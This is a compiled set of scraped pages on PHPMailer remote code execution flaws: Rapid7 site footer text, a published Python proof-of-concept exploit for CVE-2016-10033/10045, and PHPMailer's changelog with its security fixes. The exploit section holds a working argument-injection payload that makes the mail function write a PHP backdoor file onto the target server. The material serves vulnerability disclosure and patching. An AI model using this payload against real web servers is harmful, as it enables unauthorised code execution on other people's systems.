[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

© Rapid7
[Legal Terms](/legal/)
  |   [Privacy Policy](/privacy-policy/)
  |   [Export Notice](/export-notice/)
  |   [Trust](/trust/)
  |   Do Not Sell or Share My Personal Information
  |   Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1–866–390–8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)



=== Content from legalhackers.com_a270e224_20250126_062425.html ===
#!/usr/bin/python
intro = """
PHPMailer RCE PoC Exploits
PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
+
PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
(the bypass of the first patch for CVE-2016-10033)
Discovered and Coded by:
Dawid Golunski
@dawid\_golunski
https://legalhackers.com
"""
usage = """
Usage:
Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html
PoC Video:
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
Disclaimer:
For testing purposes only. Do no harm.
"""
import time
import urllib
import urllib2
import socket
import sys
RW\_DIR = "/var/www/html/uploads"
url = 'http://VictimWebServer/contact\_form.php' # Set destination URL here
# Choose/uncomment one of the payloads:
# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
#payload = '"attacker\\" -oQ/tmp/ -X%s/phpcode.php some"@email.com' % RW\_DIR
# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
payload = "\"attacker\\' -oQ/tmp/ -X%s/phpcode.php some\"@email.com" % RW\_DIR
######################################
# PHP code to be saved into the backdoor php file on the target in RW\_DIR
RCE\_PHP\_CODE = "php phpinfo(); ?"
post\_fields = {'action': 'send', 'name': 'Jas Fasola', 'email': payload, 'msg': RCE\_PHP\_CODE}
# Attack
data = urllib.urlencode(post\_fields)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the\_page = response.read()


=== Content from github.com_9b3f5e09_20250126_062434.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer%2Fblob%2Fmaster%2Fchangelog.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer%2Fblob%2Fmaster%2Fchangelog.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=PHPMailer%2FPHPMailer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PHPMailer](/PHPMailer)
/
**[PHPMailer](/PHPMailer/PHPMailer)**
Public

* [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings
* [Fork
  9.7k](/login?return_to=%2FPHPMailer%2FPHPMailer)
* [Star
   21.2k](/login?return_to=%2FPHPMailer%2FPHPMailer)

* [Code](/PHPMailer/PHPMailer)
* [Issues
  36](/PHPMailer/PHPMailer/issues)
* [Pull requests
  11](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects
  0](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

Additional navigation options

* [Code](/PHPMailer/PHPMailer)
* [Issues](/PHPMailer/PHPMailer/issues)
* [Pull requests](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

## Files

 master
## Breadcrumbs

1. [PHPMailer](/PHPMailer/PHPMailer/tree/master)
/
# changelog.md

Copy path Blame  Blame
## Latest commit

## History

[History](/PHPMailer/PHPMailer/commits/master/changelog.md)1078 lines (954 loc) · 51 KB master
## Breadcrumbs

1. [PHPMailer](/PHPMailer/PHPMailer/tree/master)
/
# changelog.md

Top
## File metadata and controls

* Preview
* Code
* Blame

1078 lines (954 loc) · 51 KB[Raw](https://github.com/PHPMailer/PHPMailer/raw/refs/heads/master/changelog.md)
# PHPMailer Change Log

## Version 6.9.3 (November 22nd, 2024)

* Add support for the release version of PHP 8.4
* Add experimental support for PHP 8.5
* Use rfc-editor.org for all RFC docs links

## Version 6.9.2 (October 9th, 2024)

* Escape dots in SMTP transaction ID patterns
* Add link to [aboutmy.email](https://aboutmy.email) testing service in docs
* Add a more comprehensive example for using XOAUTH2 with gmail and Azure, thanks to @decomplexity
* Update Turkish, Spanish, Japanese, Russian, French translations
* Add Urdu & Kurdish (Sorani) translations
* Fix broken links in docs and comments, avoid http links, correct link to LGPL 2.1 license file
* Cleaner PSR-3 SMTP debug logging
* Bump GitHub action versions
* Fix error handler scope issue in POP3 and SMTP classes
* Numerous test improvements by @jrfnl

## Version 6.9.1 (November 25th, 2023)

* Finalise SendOauth2 example

## Version 6.9.0 (November 23rd, 2023)

* Add support for official release of PHP 8.3, add experimental support for PHP 8.4
* Add `clearCustomHeader` and `replaceCustomHeader` methods
* Add support for the XCLIENT SMTP extension with `setSMTPXclientAttribute` and `getSMTPXclientAttributes` methods
* Don't attempt opportunistic TLS when connecting to localhost
* Add package link and example showing how to use @decomplexity's SendOauth2 wrapper
* Update example to show a better way of using an SMTP subclass
* Avoid some more deprecation warnings
* Update Danish and Polish translations
* Add Bengali and Assamese translations

## Version 6.8.1 (August 29th, 2023)

* Don't reflect malformed DSNs in error messages to avert any risk of XSS
* Improve Simplified Chinese, Sinhalese, and Norwegian translations
* Don't use `setAccessible` in PHP >= 8.1 in tests
* Avoid a deprecation notice in PHP 8.3
* Fix link in readme

## Version 6.8.0 (March 6th, 2023)

* Add DSN parsing class, thanks to @voronkovich
* Fix some name edge cases, expand tests
* Add pattern for ZonMTA message IDs
* Improve Hindi translation

## Version 6.7.1 (December 8th, 2022)

* Add official support for PHP 8.2
* Add PHP 8.3 to test suite with "experimental" status
* Add ext-openssl to composer suggest list
* Bump development dependencies

## Version 6.7 (December 5th, 2022)

* Break out boundary definitions into a method (note that boundary format has also changed slightly)
* Remove MIME preamble to match popular client behaviour, may help with DKIM too
* Fix handling of trailing whitespace in simple DKIM canonicalisation
* Fix some possible POP3 auth issues, including a TCP hang (thanks to @czirkoszoltan)
* Add Azure XOAUTH2 example and docs (thanks to @greew)
* Preserve errors during disconnect
* Avoid some PHP 8.1 type issues
* Update CI to run on Ubuntu 22.04

## Version 6.6.5 (October 7th, 2022)

* Don't try to issue RSET if there has been a connection error
* Reject attempts to add folders as attachments
* Don't suppress earlier error messages on close()
* Handle Host === null better
* Update Danish and Polish translations
* Change recommendation for Microsoft OAuth package to thenetworg/oauth2-azure
* Bump some GitHub action versions

## Version 6.6.4 (August 22nd, 2022)

* Update Greek translation
* Add text/csv MIME type
* Fix DKIM when sending to anonymous group via mail()
* Improve docs around auth following gmail & MS deprecations
* Update GitHub action deps
* Add OpenSSF Scorecard security health metrics

## Version 6.6.3 (June 20th, 2022)

* Add an HTML form to the OAuth setup script
* Minor CS improvements
* Add Mongolian translation
* Remove bogus "ch" translation

## Version 6.6.2 (June 14th, 2022)

* Fix docs deployment GitHub action
* Updates to parallel-lint and console highlighter, thanks to @jrfnl

## Version 6.6.1 (June 14th, 2022) (unreleased)

* Don't clear errors on RSET, so they can still be obtained when using keepalive
* Bump some GitHub action versions
* Fix some tests
* 🇺🇦 Slava Ukraini!

## Version 6.6 (February 28th, 2022)

* Introduce interface for OAuth providers, making it easier to use OAuth libraries other than the League one, thanks to @pdscopes.
* Add more contextual information to TLS connection failure error messages, and throw exceptions on TLS connection errors, thanks to @miken32

## Version 6.5.4 (February 17th, 2022)

* If we can't use escaping functions, refuse to do unsafe things
* Avoid PHP 8.1 trim issue
* Add tests for XMailer
* Fix bug in use of CharSet property
* Fix bug in file upload example
* Update dev dependencies

## Version 6.5.3 (November 25th, 2021)

* Wrong commit tagged for the 6.5.2 release!
* Version file updated

## Version 6.5.2 (November 25th, 2021)

* Enable official support for PHP 8.1
* Enable experimental support for PHP 8.2
* Fix for PHP 5.6
* Fix for incorrect options for punyencoding IDNs

## Version 6.5.1 (August 18th, 2021)

* Provisional support for PHP 8.1
* Major overhaul of test suite
* Add codecov.io coverage reporting
* Prefer implicit TLS on port 465 as default encryption scheme in examples, as per RFC8314
* Fix potential noisy output from IMAP address parser
* Stricter checking of custom MessageID validity
* Replace invalid default From address
* Support fallback for languages, so a request for `pt_xx` will fall back to `pt` rather than the default `en`.
* Support multi-line RFC2047 addresses in parseAddresses
* Improved Japanese translation

Many thanks to @jrfnl for all her work.

## Version 6.5.0 (June 16th, 2021)

* **SECURITY** Fixes CVE-2021-34551, a complex RCE affecting Windows hosts. See [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md) for details.
* The fix for this issue changes the way that language files are loaded. While they remain in the same PHP-like format, they are processed as plain text, and any code in them will not be run, including operations such as concatenation using the `.` operator.
* *Deprecation* The current translation file format using PHP arrays is now deprecated; the next major version will introduce a new format.
* **SECURITY** Fixes CVE-2021-3603 that may permit untrusted code to be run from an address validator. See [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md) for details.
* The fix for this issue includes a minor BC break: callables injected into `validateAddress`, or indirectly through the `$validator` class property, may no longer be simple strings. If you want to inject your own validator, provide a closure instead of a function name.
* Haraka message ID strings are now recognised

## Version 6.4.1 (April 29th, 2021)

* **SECURITY** Fixes CVE-2020-36326, a regression of CVE-2018-19296 object injection introduced in 6.1.8, see SECURITY.md for details
* Reject more file paths that look like URLs, matching RFC3986 spec, blocking URLS using schemes such as `ssh2`
* Ensure method signature consistency in `doCallback` calls
* Ukrainian language update
* Add composer scripts for checking coding standards and running tests

## Version 6.4.0 (March 31st, 2021)

* Revert change that made the `mail()` and sendmail transports set the envelope sender if one isn't explicitly provided, as it causes problems described in [#2298](https://github.com/PHPMailer/PHPMailer/issues/2298)
* Check for mbstring extension before decoding addresss in `parseAddress`
* Add Serbian Latin translation (`sr_latn`)
* Enrol PHPMailer in Tidelift

## Version 6.3.0 (February 19th, 2021)

* Handle early connection errors such as 421 during connection and EHLO states
* Switch to GitHub Actions for CI
* Generate debug output for `mail()`, sendmail, and qmail transports. Enable using the same mechanism as for SMTP: set `SMTPDebug` > 0
* Make the `mail()` and sendmail transports set the envelope sender the same way as SMTP does, i.e. use whatever `From` is set to, only falling back to the `sendmail_from` php.ini setting if `From` is unset. This avoids errors from the `mail()` function if `Sender` is not set explicitly and php.ini is not configured. This is a minor functionality change, so bumps the minor version number.
* Extend `parseAddresses` to decode encoded names, improve tests

## Version 6.2.0

* PHP 8.0 compatibility, many thanks to @jrf\_nl!
* Switch from PHP CS Fixer to PHP CodeSniffer for coding standards
* Create class constants for the debug levels in the POP3 class
* Improve French, Slovenian, and Ukrainian translations
* Improve file upload examples so file extensions are retained
* Resolve PHP 8 line break issues due to a very old PHP bug being fixed
* Avoid warnings when using old openssl functions
* Improve Travis-CI build configuration

## Version 6.1.8 (October 9th, 2020)

* Mark `ext-hash` as required in composer.json. This has long been required, but now it will cause an error at install time rather than runtime, making it easier to diagnose
* Make file upload examples safer
* Update links to SMTP testing servers
* Avoid errors when set\_time\_limit is disabled (you need better hosting!)
* Allow overriding auth settings for local tests; makes it easy to run tests using HELO
* Recover gracefully from errors during keepalive sessions
* Add AVIF MIME type mapping
* Prevent duplicate `To` headers in BCC-only messages when using `mail()`
* Avoid file function problems when attaching files from Windows UNC paths
* Improve German, Bahasa Indonesian, Filipino translations
* Add Javascript-based example
* Increased test coverage

## Version 6.1.7 (July 14th, 2020)

* Split SMTP connection into two separate methods
* Undo BC break in PHP versions 5.2.3 - 7.0.0 introduced in 6.1.2 when injecting callables for address validation and HTML to text conversion
* Save response to SMTP welcome banner as other responses are saved
* Retry stream\_select if interrupted by a signal

## Version 6.1.6 (May 27th, 2020)

* **SECURITY** Fix insufficient output escaping bug in file attachment names. CVE-2020-13625. Reported by Elar Lang of Clarified Security.
* Correct Armenian ISO language code from `am` to `hy`, add mapping for fallback
* Use correct timeout property in debug output

## Version 6.1.5 (March 14th, 2020)

* Reject invalid custom headers that are empty or contain breaks
* Various fixes for DKIM issues, especially when using `mail()` transport
* Drop the `l=` length tag from DKIM signatures; it's a mild security risk
* Ensure CRLF is used explicitly when needed, rather than `static::$LE`
* Add a method for trimming header content consistently
* Some minor tweaks to resolve static analyser complaints
* Check that attachment files are readable both when adding *and* when sending
* Work around Outlook bug in mishandling MIME preamble
* Danish translation improvements

## Version 6.1.4 (December 10th, 2019)

* Clean up hostname handling
* Avoid IDN error on older PHP versions, prep for PHP 8.0
* Don't force RFC2047 folding unnecessarily
* Enable tests on full release of PHP 7.4

## Version 6.1.3 (November 21st, 2019)

* Fix an issue preventing injected debug handlers from working
* Fix an issue relating to connection timeout
* Add `SMTP::MAX_REPLY_LENGTH` constant
* Remove some dev dependencies; phpdoc no longer included
* Fix an issue where non-compliant servers returning bare codes caused an SMTP hang

## Version 6.1.2 (November 13th, 2019)

* Substantial revision of DKIM header generation
* Use shorter hashes for auto-generated CID values
* Fix format of content-id headers, and only use them for inline attachments
* Remove all use of XHTML
* Lots of coding standards cleanup
* API docs are now auto-updated via GitHub actions
* Fix header separation bug created in 6.1.1
* Fix misidentification of background attributes in SVG images in msgHTML

## Version 6.1.1 (September 27th 2019)

* Fix misordered version tag

## Version 6.1.0 (September 27th 2019)

* Multiple bug fixes for folding of long header lines, thanks to @caugner
* Add support for [RFC2387 child element content-type hint](https://www.rfc-editor.org/rfc/rfc2387#section-3.1) in `multipart/related` structures.
* Support for Ical event methods other than `REQUEST`, thanks to @puhr-mde
* Change header folding and param separation to use spaces instead of tabs
* Use ; to separate multiple MIME header params
* Add support for RFC3461 DSN messages
* IMAP example code fixed
* Use PHP temp streams instead of temp files
* Allow for longer SMTP error codes
* Updated Brazilian Portuguese translation
* Throw exceptions on invalid encoding values
* Add Afrikaans translation, thanks to @Donno191
* Updated Farsi/Persian translation
* Add PHP 7.4 to test config
* Remove some ambiguity about setting XMailer property
* Improve error checking in mailing list example
* Drop PHP 5.5 from CI config as it's no longer supported by Travis-CI
* Fix S/MIME signing
* Add constants for encryption type
* More consistent use of constants for encryption, charset, encoding
* Add PHPMailer logo images

## Version 6.0.7 (February 1st 2019)

* Include RedHat GPL Cooperation Commitment - see the `COMMITMENT` file for details.
* Don't exclude composer.json from git exports as it breaks composer updates in projects that use PHPMailer
* Updated Malay translation
* Fix language tests

## Version 6.0.6 (November 14th 2018)

* **SECURITY** Fix potential object injection vulnerability. Reported by Sehun Oh of cyberone.kr.
* Added Tagalog translation, thanks to @StoneArtz
* Added Malagache translation, thanks to @Hackinet
* Updated Serbian translation, fixed incorrect language code, thanks to @mmilanovic4
* Updated Arabic translations (@MicroDroid)
* Updated Hungarian translations
* Updated Dutch translations
* Updated Slovenian translation (@filips123)
* Updated Slovak translation (@pcmanik)
* Updated Italian translation (@sabas)
* Updated Norwegian translation (@aleskr)
* Updated Indonesian translation (@mylastof)
* Add constants for common values, such as `text/html` and `quoted-printable`, and use them
* Added support for copied headers in DKIM, helping with debugging, and an option to add extra headers to the DKIM signature. See DKIM\_sign example for how to use them. Thanks to @gwi-mmuths.
* Add Campaign Monitor transaction ID pattern matcher
* Remove deprecated constant and ini values causing warnings in PHP 7.3, added PHP 7.3 build to Travis config.
* Expanded test coverage

## Version 5.2.27 (November 14th 2018)

* **SECURITY** Fix potential object injection vulnerability. Reported by Sehun Oh of cyberone.kr.
* Note that the 5.2 branch is now deprecated and will not receive security updates after 31st December 2018.

## Version 6.0.5 (March 27th 2018)

* Re-roll of 6.0.4 to fix missed version file entry. No code changes.

## Version 6.0.4 (March 27th 2018)

* Add some modern MIME types
* Add Hindi translation (thanks to @dextel2)
* Improve composer docs
* Fix generation of path to language files

## Version 6.0.3 (January 5th 2018)

* Correct DKIM canonicalization of line breaks for header & body - thanks to @themichaelhall
* Make dependence on ext-filter explicit in composer.json

## Version 6.0.2 (November 29th 2017)

* Don't make max line length depend on line break format
* Improve Travis-CI config - thanks to Filippo Tessarotto
* Match SendGrid transaction IDs
* `idnSupported()` now static, as previously documented
* Improve error messages for invalid addresses
* Improve Indonesian translation (thanks to @januridp)
* Improve Esperanto translation (thanks to @dknacht)
* Clean up git export ignore settings for production and zip bundles
* Update license doc
* Updated upgrading docs
* Clarify `addStringEmbeddedImage` docs
* Hide auth credentials in all but lowest-level debug output, prevents leakage in bug reports
* Code style cleanup

## Version 6.0.1 (September 14th 2017)

* Use shorter Message-ID headers (with more entropy) to avoid iCloud blackhole bug
* Switch to Symfony code style (though it's not well defined)
* CI builds now apply syntax & code style checks, so make your PRs tidy!
* CI code coverage only applied on latest version of PHP to speed up builds (thanks to @Slamdunk for these CI changes)
* Remove `composer.lock` - it's important that libraries break early; keeping it is for apps
* Rename test scripts to PSR-4 spec
* Make content-id values settable on attachments, not just embedded items
* Add SMTP transaction IDs to callbacks & allow for future expansion
* Expand test coverage

## Version 6.0 (August 28th 2017)

This is a major update that breaks backwards compatibility.

* **Requires PHP 5.5 or later**
* **Uses the `PHPMailer\PHPMailer` namespace**
* File structure simplified and PSR-4 compatible, classes live in the `src/` folder
* The custom autoloader has been removed: [**use composer**](https://getcomposer.org)!
* Classes & Exceptions renamed to make use of the namespace
* Most statically called functions now use the `static` keyword instead of `self`, so it's possible to override static internal functions in subclasses, for example `validateAddress()`
* Complete RFC standardisation on CRLF (`\r\n`) line breaks for SMTP by default:
  + `PHPMailer:$LE` defaults to CRLF
  + All uses of `PHPMailer::$LE` property converted to use `static::$LE` constant for consistency and ease of overriding
  + Similar changes to line break handling in SMTP and POP3 classes.
  + Line break format for `mail()` transport is set automatically.
  + Warnings emitted for buggy `mail()` in PHP versions 7.0.0 - 7.0.16 and 7.1.0 - 7.1.2; either upgrade or switch to SMTP.
* Extensive reworking of XOAUTH2, adding support for Google, Yahoo and Microsoft providers, thanks to @sherryl4george
* Major cleanup of docs and examples
* All elements previously marked as deprecated have been removed:
  + `PHPMailer->Version` (replaced with `VERSION` constant)
  + `PHPMailer->ReturnPath`
  + `PHPMailer->PluginDir`
  + `PHPMailer->encodeQPphp()`
  + `SMTP->CRLF` (replaced with `LE` constant)
  + `SMTP->Version` (replaced with `VERSION` constant)
  + `SMTP->SMTP_PORT` (replaced with `DEFAULT_PORT` constant)
  + `POP3->CRLF` (replaced with `LE` constant)
  + `POP3->Version` (replaced with `VERSION` constant)
  + `POP3->POP3_PORT` (replaced with `DEFAULT_PORT` constant)
  + `POP3->POP3_TIMEOUT` (replaced with `DEFAULT_TIMEOUT` constant)
* NTLM authentication has been removed - it never worked anyway!
  + `PHPMailer->Workstation`
  + `PHPMailer->Realm`
* `SingleTo` functionality is deprecated; this belongs at a higher level - PHPMailer is not a mailing list system.
* `SMTP::authenticate` method signature changed
* `parseAddresses()` is now static
* `validateAddress()` is now called statically from `parseAddresses()`
* `idnSupported()` is now static and is called statically from `punyencodeAddress()`
* `PHPMailer->SingleToArray` is now protected
* `fixEOL()` method removed - it duplicates `PHPMailer::normalizeBreaks()`, so use that instead
* Don't try to use an auth mechanism if it's not supported by the server
* Reorder automatic AUTH mechanism selector to try most secure method first
* `Extras` classes have been removed - use alternative packages from [packagist.org](https://packagist.org) instead
* Better handling of automatic transfer encoding switch in the presence of long lines
* Simplification of address validation - now uses PHP's `FILTER_VALIDATE_EMAIL` pattern by default, retains advanced options
* `Debugoutput` can accept a PSR-3 logger instance
* To reduce code footprint, the examples folder is no longer included in composer deployments or GitHub zip files
* Trap low-level errors in SMTP, reports via debug output
* More reliable folding of message headers
* Inject your own SMTP implementation via `setSMTPInstance()` instead of having to subclass and override `getSMTPInstance()`.
* Make obtaining SMTP transaction ID more reliable
* Better handling of unreliable PHP timeouts
* Made `SMTPDebug = 4` slightly less noisy

## Version 5.2.25 (August 28th 2017)

* Make obtaining SMTP transaction ID more reliable
* Add Bosnian translation
* This is the last official release in the legacy PHPMailer 5.2 series; there may be future security patches (which will be found in the [5.2-stable branch](https://github.com/PHPMailer/PHPMailer/tree/5.2-stable)), but no further non-security PRs or issues will be accepted. Migrate to PHPMailer 6.0.

## Version 5.2.24 (July 26th 2017)

* **SECURITY** Fix XSS vulnerability in one of the code examples, [CVE-2017-11503](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-11503). The `code_generator.phps` example did not filter user input prior to output. This file is distributed with a `.phps` extension, so it is not normally executable unless it is explicitly renamed, so it is safe by default. There was also an undisclosed potential XSS vulnerability in the default exception handler (unused by default). Patches for both issues kindly provided by Patrick Monnerat of the Fedora Project.
* Handle bare codes (an RFC contravention) in SMTP server responses
* Make message timestamps more dynamic - calculate the date separately for each message
* More thorough checks for reading attachments.
* Throw an exception when trying to send a message with an empty body caused by an internal error.
* Replaced all use of MD5 and SHA1 hash functions with SHA256.
* Now checks for invalid host strings when sending via SMTP.
* Include timestamps in HTML-format debug output
* Improve Turkish, Norwegian, Serbian, Brazilian Portuguese & simplified Chinese translations
* Correction of Serbian ISO language code from `sr` to `rs`
* Fix matching of multiple entries in `Host` to match IPv6 literals without breaking port selection (see #1094, caused by a3b4f6b)
* Better capture and reporting of SMTP connection errors

## Version 5.2.23 (March 15th 2017)

* Improve trapping of TLS errors during connection so that they don't cause warnings, and are reported better in debug output
* Amend test suite so it uses PHPUnit version 4.8, compatible with older versions of PHP, instead of the version supplied by Travis-CI
* This forces pinning of some dev packages to older releases, but should make travis builds more reliable
* Test suite now runs on HHVM, and thus so should PHPMailer in general
* Improve Czech translations
* Add links to CVE-2017-5223 resources

## Version 5.2.22 (January 5th 2017)

* **SECURITY** Fix [CVE-2017-5223](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-5223), local file disclosure vulnerability if content passed to `msgHTML()` is sourced from unfiltered user input. Reported by Yongxiang Li of Asiasecurity. The fix for this means that calls to `msgHTML()` without a `$basedir` will not import images with relative URLs, and relative URLs containing `..` will be ignored.
* Add simple contact form example
* Emoji in test content

## Version 5.2.21 (December 28th 2016)

* Fix missed number update in version file - no functional changes

## Version 5.2.20 (December 28th 2016)

* **SECURITY** Critical security update for CVE-2016-10045 please update now! Thanks to [Dawid Golunski](https://legalhackers.com) and Paul Buonopane (@Zenexer).
* Note that this change will break VERP addresses in Sender if you're using mail() - workaround: use SMTP to localhost instead.

## Version 5.2.19 (December 26th 2016)

* Minor cleanup

## Version 5.2.18 (December 24th 2016)

* **SECURITY** Critical security update for CVE-2016-10033 please update now! Thanks to [Dawid Golunski](https://legalhackers.com).
* Add ability to extract the SMTP transaction ID from some common SMTP success messages
* Minor documentation tweaks

## Version 5.2.17 (December 9th 2016)

* This is officially the last feature release of 5.2. Security fixes only from now on; use PHPMailer 6.0!
* Allow DKIM private key to be provided as a string
* Provide mechanism to allow overriding of boundary and message ID creation
* Improve Brazilian Portuguese, Spanish, Swedish, Romanian, and German translations
* PHP 7.1 support for Travis-CI
* Fix some language codes
* Add security notices
* Improve DKIM compatibility in older PHP versions
* Improve trapping and capture of SMTP connection errors
* Improve passthrough of error levels for debug output
* PHPDoc cleanup

## Version 5.2.16 (June 6th 2016)

* Added DKIM example
* Fixed empty additional\_parameters problem
* Fixed wrong version number in VERSION file!
* Improve line-length tests
* Use instance settings for SMTP::connect by default
* Use more secure auth mechanisms first

## Version 5.2.15 (May 10th 2016)

* Added ability to inject custom address validators, and set the default validator
* Fix TLS 1.2 compatibility
* Remove some excess line breaks in MIME structure
* Updated Polish, Russian, Brazilian Portuguese, Georgian translations
* More DRY!
* Improve error messages
* Update dependencies
* Add example showing how to handle multiple form file uploads
* Improve SMTP example
* Improve Windows compatibility
* Use consistent names for temp files
* Fix gmail XOAUTH2 scope, thanks to @sherryl4george
* Fix extra line break in getSentMIMEMessage()
* Improve DKIM signing to use SHA-2

## Version 5.2.14 (Nov 1st 2015)

* Allow addresses with IDN (Internationalized Domain Name) in PHP 5.3+, thanks to @fbonzon
* Allow access to POP3 errors
* Make all POP3 private properties and methods protected
* **SECURITY** Fix vulnerability that allowed email addresses with line breaks (valid in RFC5322) to pass to SMTP, permitting message injection at the SMTP level. Mitigated in both the address validator and in the lower-level SMTP class. Thanks to Takeshi Terada.
* Updated Brazilian Portuguese translations (Thanks to @phelipealves)

## Version 5.2.13 (Sep 14th 2015)

* Rename internal oauth class to avoid name clashes
* Improve Estonian translations

## Version 5.2.12 (Sep 1st 2015)

* Fix incorrect composer package dependencies
* Skip existing embedded image `cid`s in `msgHTML`

## Version 5.2.11 (Aug 31st 2015)

* Don't switch to quoted-printable for long lines if already using base64
* Fixed Travis-CI config when run on PHP 7
* Added Google XOAUTH2 authentication mechanism, thanks to @sherryl4george
* Add address parser for RFC822-format addresses
* Update MS Office MIME types
* Don't convert line breaks when using quoted-printable encoding
* Handle MS Exchange returning an invalid empty AUTH-type list in EHLO
* Don't set name or filename properties on MIME parts that don't have one

## Version 5.2.10 (May 4th 2015)

* Add custom header getter
* Use `application/javascript` for .js attachments
* Improve RFC2821 compliance for timelimits, especially for end-of-data
* Add Azerbaijani translations (Thanks to @mirjalal)
* Minor code cleanup for robustness
* Add Indonesian translations (Thanks to @ceceprawiro)
* Avoid `error_log` Debugoutput naming clash
* Add ability to parse server capabilities in response to EHLO (useful for SendGrid etc)
* Amended default values for WordWrap to match RFC
* Remove html2text converter class (has incompatible license)
* Provide new mechanism for injecting html to text converters
